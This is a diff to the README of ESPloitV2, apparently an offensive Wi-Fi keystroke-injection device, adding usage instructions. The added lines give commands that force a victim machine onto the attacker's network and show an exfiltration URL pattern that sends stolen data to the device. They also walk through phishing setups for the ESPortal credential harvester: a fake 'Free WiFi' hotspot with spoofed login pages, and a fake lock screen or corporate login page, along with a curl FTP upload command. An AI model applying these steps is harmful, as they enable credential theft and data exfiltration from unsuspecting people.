@@ -275,18 +275,19 @@ Exfiltrating Data<br>
 To exfiltrate data be sure ESPloit and Target machine are on the same network.<br>
 Either set ESPloit to join the Target's network or set the Target to join ESPloit's AP.<br>
 <br>
+Example commands to force victim to connect to ESPloit's network(when set as AP):<br>
 Windows: netsh wlan set hostednetwork mode=allow ssid="SSID-HERE" key="WIFI-PASSWORD-HERE"<br>
 Linux: nmcli dev wifi connect SSID-HERE password WIFI-PASSWORD-HERE<br>
 <br>
 For HTTP exfiltration method point the target machine to the url listed below:<br>
 http://ESPloit-IP-Here/exfiltrate?file=FILENAME.TXT&data=EXFILTRATED-DATA-HERE<br>
 <br>
-For FTP exfiltration method use the credentials configured in the "Configure ESPloit" page.<br>
+For FTP exfiltration method use the credentials configured in the "Configure ESPloit" page. Also note that only Passive Mode FTP is supported.<br>
 <br>
 See the example payloads for more in depth examples.<br>
 <br>
 -----<br>
-ESPortal Credential Harvester<br>
+ESPortal Credential Harvester(Phisher)<br>
 -----<br>
 <br>
 NOTE: Modifying any ESPortal related setting requires a reboot of the ESPloit device.<br>
@@ -297,12 +298,13 @@ A social engineering attack vector.<br>
 Redirects HTTP requests to a fake login page. 
 Does not support HTTPS requests nor does it override cached HTTPS redirects.<br>
 You can define a custom template for up to 3 specific domains, a welcome portal, and a catch-all.<br>
-<br>
-Example scenario: Setup ESPloitV2 to act as a free WiFi hotspot.<br>
-<br>
 Captured credentials are stored on the exfiltration page in the file "esportal-log.txt".<br>
 <br>
-Custom html templates can be uploaded for the ESPortal login credential harvester via FTP.<br>
+Example scenario 1: Target capturing login credentials from a specific domain name when victim connects to a fake free WiFi hotspot. Setup ESPloitV2 to act as a free WiFi hotspot(AP Mode, SSID: "Free WiFi", Open Network=Leave Password Blank). Set ESPortal to Enabled, Site 1 Domain(fakesite1.com). User now connects to the open network "Free WiFi", browses to fakesite1.com, they see a login prompt, user attempts to login, ESPortal gives an error, user gets frustrated and gives up. Meanwhile the credentials the user entered are logged and displayed on the Exfiltrated Data page in the file "esportal-log.txt". To make the attack even more effective I have included the ability for the attacker to make their own html templates for the login pages. If the user were to browse to another page not specified as a domain in the settings they will be greeted with a generic login prompt set from the spoof_other.html template.<br>
+<br>
+Example scenario 2: Thinking slightly outside of the box... ESPloit is connected the victims network(and is not in AP mode), in this example ESPloit's IP is 192.168.1.169, FTP mode is enabled. Under ESPortal settings set the Welcome Domain to the ESPloit's IP address(192.168.1.169) and set Welcome Page On(/login). Now upload a custom login template to ESPloit named welcome.html(do not use the included welcome.html template as that is simply a greeting and we want a login page so use and rename the included template spoof_other.html to welcome.html and upload it via FTP), here is a Linux example for uploading the custom template via FTP(curl -T spoof_other.html ftp://ftp-admin:hacktheplanet@192.168.1.169/welcome.html). Now when you browse to 192.168.1.169 you are redirected to a login prompt at 192.168.1.169/login. You can now create a payload to open this webpage on the victims pc and customize the template to whatever you want. Even though there are easier ways you could use it to capture user login credentials from the victim PC, so you could fullscreen the browser window and make the custom html template look like the PC's lock screen. Or you could make it look like a login page for a website for which you wish to phish credentials. It could also be used to hide ESPloit's admin panel, perhaps when a user browses to ESPloit's IP they go to a "corporate server login page" which user is not authorized to access, remember in ESPortal mode ESPloit's admin panel shows up on http://esploitIP/esploit vs being able to access it from the default http://esploitIP when ESPortal mode is disabled. Remember social engineering is all about being creative.<br>
+<br>
+Custom html templates can be uploaded for the ESPortal login credential harvester via FTP(PASV Mode only).<br>
 If a custom html template is found it will override the default settings.<br>
 Upon deletion the default settings are automatically restored.<br>
 <br>
